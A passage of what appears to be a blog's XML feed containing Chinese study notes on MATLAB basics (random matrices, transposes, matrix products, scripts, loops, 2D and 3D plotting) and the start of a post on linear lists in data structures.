operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果B <span class="token operator">=</span>       <span class="token number">8</span>     <span class="token number">1</span>     <span class="token number">6</span>       <span class="token number">3</span>     <span class="token number">5</span>     <span class="token number">7</span>       <span class="token number">4</span>     <span class="token number">9</span>     <span class="token number">2</span></code></pre><blockquote><p>​    这里我们学习一下<code>randi()</code>函数，randi的第一个参数可以用于描述产生矩阵的数值范围，后面的两个参数是行列数，例如：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">a <span class="token operator">=</span> <span class="token function">randi</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果a <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">13</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">9</span>    <span class="token number">19</span>     <span class="token number">2</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">19</span>     <span class="token number">3</span>     <span class="token number">6</span>     <span class="token number">4</span>    <span class="token number">17</span>    <span class="token number">16</span>    <span class="token number">19</span>    <span class="token number">11</span>    <span class="token number">20</span>     <span class="token number">3</span>    <span class="token number">20</span></code></pre><h2 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h2><blockquote><p>​    我们知道矩阵有实数矩阵和复数矩阵两种，对于实矩阵，<em>转置</em>运算对 aij 和 aji 进行交换。对于复矩阵，还要考虑是否用数组中复数项的复共轭来形成<em>复共轭转置</em>。MATLAB 使用撇号运算符 (<code>&#39;</code>) 执行复共轭转置，使用点撇号运算符 (<code>.&#39;</code>) 执行无共轭的转置。对于包含所有实数元素的矩阵，这两个运算符返回相同结果。 </p><p>实矩阵转置示例：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">#这里拿上一步的a值做测试a<span class="token operator">'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span>#事实证明实矩阵 a<span class="token operator">'</span>和a<span class="token operator">.'</span>操作是一样的结果     a<span class="token operator">.'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span></code></pre><blockquote><p>定义复数矩阵并进行转置:</p></blockquote><pre class=" language-matlab"><code class="language-matlab">z <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">i</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">9</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">5i</span><span class="token punctuation">]</span>z <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span>#z 的共轭转置为：z<span class="token operator">'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">-</span> <span class="token number">5.0000i</span>#z 的非共轭转置z<span class="token operator">.'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span></code></pre><h2 id="矩阵的乘积"><a href="#矩阵的乘积" class="headerlink" title="矩阵的乘积"></a>矩阵的乘积</h2><blockquote><p>​    之前学习线性代数的时候，计算矩阵的乘积都是按公式来算，现在可以通过matlab for循环来实现这个计算：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>m     <span class="token keyword">for</span> <span class="token number">j</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n        <span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><blockquote><p>​    按矩阵乘法规则，矩阵可以在其右侧乘以列向量，在左侧乘以行向量。</p></blockquote><blockquote><p>​    接下来结合具体数学实例，来进行更深入的综合性学习。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;数学建模-day5-线性代数&quot;&gt;&lt;a href=&quot;#数学建模-day5-线性代数&quot; class=&quot;headerlink&quot; title=&quot;数学建模_day5 - 线性代数&quot;&gt;&lt;/a&gt;数学建模_day5 - 线性代数&lt;/h1&gt;&lt;blockqu
      
    
    </summary>
    
      <category term="数学建模" scheme="http://www.yof3ng.xyz/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
      <category term="数模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>数学建模-day4</title>
    <link href="http://www.yof3ng.xyz/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/"/>
    <id>http://www.yof3ng.xyz/2018/10/09/数学建模-day4/</id>
    <published>2018-10-09T15:00:06.000Z</published>
    <updated>2018-10-10T14:12:50.179Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day4-matlab编程和脚本"><a href="#数学建模-day4-matlab编程和脚本" class="headerlink" title="数学建模_day4 - matlab编程和脚本"></a>数学建模_day4 - matlab编程和脚本</h1><h2 id="创建与运行脚本"><a href="#创建与运行脚本" class="headerlink" title="创建与运行脚本"></a>创建与运行脚本</h2><blockquote><p>​    <em>脚本</em>是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为 <code>.m</code> 的文件。在命令行中键入脚本名称即可运行该脚本。 </p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 要创建脚本，可以使用 <code>edit &quot;filename&quot;</code></p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">% 这会打开一个名为 "filename".m 的空白文件。输入一些绘制随机数据的向量的代码：</span>n <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true">% mean 函数求均值，对生成的50个值求平均</span><span class="token comment" spellcheck="true">% mean(r,1)表示对每列求平均</span><span class="token comment" spellcheck="true">% mean(r,2)表示对每行求平均</span><span class="token comment" spellcheck="true">% Draw a line from (0,m) to (n,m)</span>m <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% hold on 是当前轴及图像保持而不被刷新，准备接受此后将绘制的图形，多图共存</span>hold on<span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>m<span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">% hold off 是当前轴及图像不再具备被刷新的性质，新图出现时，取消原图。即，关闭图形保持功能</span>hold off<span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Mean of Random Uniform Data'</span><span class="token punctuation">)</span></code></pre><blockquote><p>成品图如下：</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/10/5bbdfdf74ac32.png" alt=""><br><br></div><blockquote><p>保存文件后可以通过右键运行，也可直接输入文件名运行。</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0157d413b.png" alt=""><br><br></div><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><blockquote><p>通过一段代码来直接看看matlab的for循环有什么不一样：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">nsamples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>npoints <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% matlab 的 for循环是 for i=n:m 的形式，范围为n到m，需要用end关键词表示结束</span><span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>nsamples   iterationString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Iteration #'</span><span class="token punctuation">,</span><span class="token function">int2str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">%disp类似printf 用于打印语句</span>   <span class="token function">disp</span><span class="token punctuation">(</span>iterationString<span class="token punctuation">)</span>   currentData <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>npoints<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">sampleMean</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>currentData<span class="token punctuation">)</span><span class="token keyword">end</span>overallMean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>sampleMean<span class="token punctuation">)</span></code></pre><blockquote><p>效果图如下：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe048ca9c1b.png" alt=""></div><blockquote><p>需要注意的是：脚本位置</p><blockquote><p>MATLAB 在特定位置中查找脚本及其他文件。要运行脚本，该文件必须位于当前文件夹或<em>搜索路径</em>中的某个文件夹内。</p><p>默认情况下，MATLAB 安装程序创建的 <code>MATLAB</code> 文件夹位于此搜索路径中。如果要将程序存储在其他文件夹，或者要运行其他文件夹中的程序，请将其添加到此搜索路径。在当前文件夹浏览器中选中相应的文件夹，右键点击，然后选择<strong>添加到路径</strong>。</p></blockquote></blockquote><h2 id="用函数生成矩阵"><a href="#用函数生成矩阵" class="headerlink" title="用函数生成矩阵"></a>用函数生成矩阵</h2><table><thead><tr><th style="text-align:left">函数</th><th>特征</th></tr></thead><tbody><tr><td style="text-align:left">ones</td><td>全部为1</td></tr><tr><td style="text-align:left">rand</td><td>均匀分布的随机元素</td></tr><tr><td style="text-align:left">randn</td><td>正态分布的随机元素</td></tr><tr><td style="text-align:left">zeros</td><td>全部为0</td></tr><tr><td style="text-align:left">magic</td><td>创建几乎任意大小的幻方矩阵</td></tr></tbody></table><h2 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h2><blockquote><p>所有 MATLAB函数都有辅助文档，这些文档包含一些示例，并介绍函数输入、输出和调用语法。从命令行访问此信息有多种方法，如下图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0593a6722.png" alt=""></div><blockquote><p>今日到此。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;数学建模-day4-matlab编程和脚本&quot;&gt;&lt;a href=&quot;#数学建模-day4-matlab编程和脚本&quot; class=&quot;headerlink&quot; title=&quot;数学建模_day4 - matlab编程和脚本&quot;&gt;&lt;/a&gt;数学建模_day
      
    
    </summary>
    
      <category term="数学建模" scheme="http://www.yof3ng.xyz/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
      <category term="数模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>数学建模-day3</title>
    <link href="http://www.yof3ng.xyz/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/"/>
    <id>http://www.yof3ng.xyz/2018/10/07/数学建模-day3/</id>
    <published>2018-10-07T15:07:14.000Z</published>
    <updated>2018-10-08T07:01:03.060Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day3-matlab-基本用法"><a href="#数学建模-day3-matlab-基本用法" class="headerlink" title="数学建模_day3 - matlab 基本用法"></a>数学建模_day3 - matlab 基本用法</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; day3 继续 day2的 matlab 基本用法学习，今天学习数学模型绘图，matlab的绘图功能十分强大，各种功能如下图。</p><p><img src="https://i.loli.net/2018/10/08/5bbaf8f1ec8e8.png" alt=""></p><h2 id="六-根据条件构建二维图和三维图像"><a href="#六-根据条件构建二维图和三维图像" class="headerlink" title="六. 根据条件构建二维图和三维图像"></a>六. 根据条件构建二维图和三维图像</h2><h3 id="plot-函数-–-二维"><a href="#plot-函数-–-二维" class="headerlink" title="plot 函数 – 二维"></a>plot 函数 – 二维</h3><p> &nbsp; &nbsp; &nbsp; 创建二维线图首先需要构建一个二维的函数，比如常见的 y = sin(x)，y = 2*x，y = 2^x。</p><p> &nbsp; &nbsp; &nbsp; 可以通过以下代码定义y = sin(x)函数:</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span>创建一个<span class="token operator">-</span><span class="token number">100</span>到<span class="token number">100</span>步长为<span class="token number">10</span>的一维数组用来作为Xy <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">/</span><span class="token operator">/</span>构成函数 y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae75ed9328.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; 因为步长的关系造成了这张图片的狰狞，不过没关系，我们可以改一下x的范围：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>改成单位圆范围y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae85f7aa9f.png" alt=""><br><br></div><h3 id="surf-和-mesh-函数-–-三维"><a href="#surf-和-mesh-函数-–-三维" class="headerlink" title="surf 和 mesh 函数 – 三维"></a>surf 和 mesh 函数 – 三维</h3><p> &nbsp; &nbsp; &nbsp; 三维图通常显示一个由带两个变量的函数（即 <em>z = f (x,y</em>)）定义的曲面图。 surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p><p> &nbsp; &nbsp; &nbsp; 例如在三维坐标系中，构建一个 Z=1，-1&lt;x&lt;1，-1&lt;y&lt;1，的平面，我们要输入以下代码：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">=</span> x<span class="token punctuation">;</span>z <span class="token operator">=</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf6e837e65.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; exp函数，例如exp(5)代表的是e^5。要计算 <em>z</em>，请首先使用 <code>meshgrid</code> 在将要创建的三维函数的域中创建一组 (<em>x,y</em>) 点。 ：</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">meshgrid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>创建<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>点Z <span class="token operator">=</span> X <span class="token operator">.*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>X<span class="token operator">.^</span><span class="token number">2</span> <span class="token operator">-</span> Y<span class="token operator">.^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>得到Z<span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span>；                <span class="token operator">/</span><span class="token operator">/</span>画图</code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf9b2535a5.png" alt=""></div><h3 id="cylinder-和-subplot-函数"><a href="#cylinder-和-subplot-函数" class="headerlink" title="cylinder 和 subplot 函数"></a>cylinder 和 subplot 函数</h3><p> &nbsp; &nbsp; &nbsp; cylinder通常用于生成圆柱模型并返回x，y，z坐标值，subplot通常用于分割窗口用以显示不同的图形。</p><pre class=" language-matlab"><code class="language-matlab">Matlab cylinder 函数：　　<span class="token number">1</span>、cylinder函数功能说明：绘制三维圆柱图。　　<span class="token number">2</span>、cylinder函数用法说明：　　（<span class="token number">1</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span>cylinder 函数返回一半径和高度都为<span class="token number">1</span>的圆柱体x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">2</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">3</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有n个等距分布的点；　　（<span class="token number">4</span>）<span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span> 函数只绘制圆柱，没有任何的输出参量。其他参量及结果同上。</code></pre><p> &nbsp; &nbsp; &nbsp; 用一个例子来展示一下cylinder和subplot的用法：</p><pre class=" language-matlab"><code class="language-matlab">t <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X,Y,Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbafba7df128.png" alt=""></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;数学建模-day3-matlab-基本用法&quot;&gt;&lt;a href=&quot;#数学建模-day3-matlab-基本用法&quot; class=&quot;headerlink&quot; title=&quot;数学建模_day3 - matlab 基本用法&quot;&gt;&lt;/a&gt;数学建模_day
      
    
    </summary>
    
      <category term="数学建模" scheme="http://www.yof3ng.xyz/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
      <category term="数模" scheme="http://www.yof3ng.xyz/tags/%E6%95%B0%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>数据结构和算法-day2</title>
    <link href="http://www.yof3ng.xyz/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/"/>
    <id>http://www.yof3ng.xyz/2018/10/07/数据结构和算法-day2/</id>
    <published>2018-10-07T11:08:02.000Z</published>
    <updated>2018-10-16T02:22:03.739Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数据结构和算法-（Algorithm）-线性结构"><a href="#数据结构和算法-（Algorithm）-线性结构" class="headerlink" title="数据结构和算法 （Algorithm）- 线性结构"></a>数据结构和算法 （Algorithm）- 线性结构</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 线性结构的基本特征是：在数据元素的非空有限集中，有且仅有一个元素没有前驱，有且仅有一个数据元素没有后继；其余数据元素有且仅有只有一个直接的前驱和后继。</p><pre class=" language-c"><code class="language-c">例如<span class="token punctuation">:</span>   <span class="token operator">*</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">*</span></code></pre><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p> &nbsp; &nbsp; &nbsp; 线性表是由同一类型的数据元素构成的线性结构，特点是：数据元素间呈一种线性关系。线性表是具有相同数据类型的n个数据元素的有限序列，通常记为：</p><p>（a1，a2，a3，······，a(i-1)，ai，a(i+1)，······，an）</p><p><code>线性表抽象数据类型</code>：</p><pre class=" language-c"><code class="language-c">ADT List<span class="token punctuation">{</span>数据对象<span class="token punctuation">:</span> D<span class="token operator">=</span><span class="token punctuation">{</span>ai<span class="token operator">|</span> <span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span>ElemSet<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">}</span>数据关系<span class="token punctuation">:</span> R1<span class="token operator">=</span><span class="token punctuation">{</span>i<span class="token number">-1</span><span class="token punctuation">,</span>ai<span class="token operator">></span><span class="token operator">|</span> ai<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span> D<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">}</span>基本操作：<span class="token function">InitList</span><span class="token 